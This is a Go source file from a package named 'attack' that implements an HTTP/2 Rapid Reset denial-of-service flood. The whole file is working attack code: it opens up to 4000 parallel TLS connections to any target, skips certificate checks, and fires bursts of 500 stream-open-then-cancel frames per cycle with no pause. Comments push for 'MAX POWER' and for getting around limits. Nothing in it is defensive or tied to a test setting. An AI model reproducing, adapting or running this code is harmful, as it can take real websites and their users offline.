package attack

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"net"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

// Aggressive Rapid Reset - no per-connection rate limit
// Each connection bursts streams as fast as possible
// Multiple connections in parallel for maximum throughput

func runRapidReset(cfg *AttackConfig) {
	atomic.StoreInt32(&stopFlag, 0)
	startTime := time.Now()
	deadline := startTime.Add(time.Duration(cfg.Duration) * time.Second)

	host, port, path, errParse := parseTargetForH2(cfg.Target)
	if errParse != nil {
		log.Printf("Invalid target: %v", errParse)
		return
	}

	// MAX POWER: massive parallel connections (no upper cap that wastes hardware)
	connCount := cfg.Threads
	if connCount < 100 {
		connCount = 200
	}
	if connCount > 4000 {
		connCount = 4000
	}

	log.Printf("RapidReset: %d parallel H2 connections, target %s:%s%s (MAX POWER mode)", connCount, host, port, path)

	// Spawn connection pool with auto-respawn (no stagger - burst all at once)
	var wg sync.WaitGroup
	for i := 0; i < connCount; i++ {
		wg.Add(1)
		go connectionWorker(i, host, port, path, deadline, &wg)
		// Light stagger only every 100 connections to avoid OS-level burst limits
		if i%100 == 99 {
			time.Sleep(1 * time.Millisecond)
		}
	}

	wg.Wait()
	metricsMu.Lock()
	metrics.Elapsed = time.Since(startTime).Seconds()
	metricsMu.Unlock()
}

func connectionWorker(id int, host, port, path string, deadline time.Time, wg *sync.WaitGroup) {
	defer wg.Done()
	defer func() {
		if r := recover(); r != nil {
			log.Printf("RR worker %d recovered: %v", id, r)
		}
	}()

	consecutiveFails := 0
	for time.Now().Before(deadline) {
		if atomic.LoadInt32(&stopFlag) == 1 {
			return
		}

		err := burstRapidReset(host, port, path, deadline)
		if err != nil {
			atomic.AddInt64(&metrics.Failed, 1)
			consecutiveFails++
			// Light backoff only - don't waste time waiting
			backoff := time.Duration(10*consecutiveFails) * time.Millisecond
			if backoff > 250*time.Millisecond {
				backoff = 250 * time.Millisecond
			}
			time.Sleep(backoff)
			if consecutiveFails > 20 {
				consecutiveFails = 0
			}
		} else {
			consecutiveFails = 0
		}
	}
}

func parseTargetForH2(target string) (host string, port string, path string, err error) {
	if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
		target = "https://" + target
	}

	u, err := url.Parse(target)
	if err != nil {
		return "", "", "", fmt.Errorf("parse url: %w", err)
	}

	host = u.Hostname()
	port = u.Port()
	if port == "" {
		if u.Scheme == "https" {
			port = "443"
		} else {
			port = "80"
		}
	}

	path = u.Path
	if path == "" {
		path = "/"
	}
	if u.RawQuery != "" {
		path += "?" + u.RawQuery
	}

	return host, port, path, nil
}

func burstRapidReset(host, port, path string, deadline time.Time) error {
	// Fast TLS dial
	dialer := &net.Dialer{Timeout: 10 * time.Second}
	rawConn, err := dialer.Dial("tcp", host+":"+port)
	if err != nil {
		return fmt.Errorf("dial: %w", err)
	}

	// TCP optimizations
	if tcpConn, ok := rawConn.(*net.TCPConn); ok {
		tcpConn.SetNoDelay(true)
		tcpConn.SetKeepAlive(true)
		tcpConn.SetKeepAlivePeriod(30 * time.Second)
	}

	tlsConn := tls.Client(rawConn, &tls.Config{
		InsecureSkipVerify: true,
		ServerName:         host,
		NextProtos:         []string{"h2"},
	})
	tlsConn.SetDeadline(time.Now().Add(15 * time.Second))

	if err := tlsConn.Handshake(); err != nil {
		rawConn.Close()
		return fmt.Errorf("handshake: %w", err)
	}

	state := tlsConn.ConnectionState()
	if state.NegotiatedProtocol != "h2" {
		tlsConn.Close()
		return fmt.Errorf("server does not support HTTP/2 (got: %s)", state.NegotiatedProtocol)
	}

	defer tlsConn.Close()

	// Remove deadlines for streaming
	tlsConn.SetDeadline(time.Time{})

	// Send connection preface
	if _, err := tlsConn.Write([]byte(http2.ClientPreface)); err != nil {
		return fmt.Errorf("preface: %w", err)
	}

	framer := http2.NewFramer(tlsConn, tlsConn)
	framer.SetMaxReadFrameSize(65536)

	// Send SETTINGS with MAX stream limits (push limits hard)
	if err := framer.WriteSettings(
		http2.Setting{ID: http2.SettingEnablePush, Val: 0},
		http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 100000},
		http2.Setting{ID: http2.SettingInitialWindowSize, Val: 16777215},
		http2.Setting{ID: http2.SettingMaxFrameSize, Val: 16777215},
		http2.Setting{ID: http2.SettingMaxHeaderListSize, Val: 1048576},
	); err != nil {
		return fmt.Errorf("settings: %w", err)
	}

	// Start drain goroutine to read server frames
	drainDone := make(chan struct{})
	go func() {
		defer close(drainDone)
		defer func() { recover() }()
		for {
			if atomic.LoadInt32(&stopFlag) == 1 {
				return
			}
			tlsConn.SetReadDeadline(time.Now().Add(2 * time.Second))
			_, err := framer.ReadFrame()
			if err != nil {
				return
			}
		}
	}()

	// Pre-encode headers (reused for all streams)
	authority := host
	if port != "443" {
		authority = host + ":" + port
	}

	var headerBuf bytes.Buffer
	encoder := hpack.NewEncoder(&headerBuf)
	encoder.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
	encoder.WriteField(hpack.HeaderField{Name: ":path", Value: path})
	encoder.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
	encoder.WriteField(hpack.HeaderField{Name: ":authority", Value: authority})
	encoder.WriteField(hpack.HeaderField{Name: "accept", Value: "text/html,application/xhtml+xml,*/*"})
	encoder.WriteField(hpack.HeaderField{Name: "accept-language", Value: "en-US,en;q=0.9"})
	encoder.WriteField(hpack.HeaderField{Name: "accept-encoding", Value: "gzip, deflate, br"})
	encoder.WriteField(hpack.HeaderField{Name: "user-agent", Value: randomUA()})
	encoder.WriteField(hpack.HeaderField{Name: "cache-control", Value: "no-cache"})

	headerBytes := append([]byte{}, headerBuf.Bytes()...)

	// MAX POWER: aggressive burst, no pause
	streamID := uint32(1)
	connDeadline := time.Now().Add(60 * time.Second) // Refresh connection every 60s

	for time.Now().Before(deadline) && time.Now().Before(connDeadline) {
		if atomic.LoadInt32(&stopFlag) == 1 {
			return nil
		}

		// MAX BURST: 500 streams per cycle (was 100)
		for i := 0; i < 500; i++ {
			if streamID > 0x7FFFFFFE {
				return nil // need fresh connection
			}

			err := framer.WriteHeaders(http2.HeadersFrameParam{
				StreamID:      streamID,
				BlockFragment: headerBytes,
				EndStream:     true,
				EndHeaders:    true,
			})
			if err != nil {
				return fmt.Errorf("write headers: %w", err)
			}

			err = framer.WriteRSTStream(streamID, http2.ErrCodeCancel)
			if err != nil {
				return fmt.Errorf("write rst: %w", err)
			}

			atomic.AddInt64(&metrics.TotalRequests, 1)
			atomic.AddInt64(&metrics.Completed, 1)
			streamID += 2
		}

		// NO SLEEP - go full speed (drain goroutine handles incoming frames in parallel)
	}

	// Send GOAWAY
	framer.WriteGoAway(streamID, http2.ErrCodeNo, []byte{})
	tlsConn.Close()

	select {
	case <-drainDone:
	case <-time.After(1 * time.Second):
	}

	return nil
}

// Helper: discard bytes
var _ = io.Discard

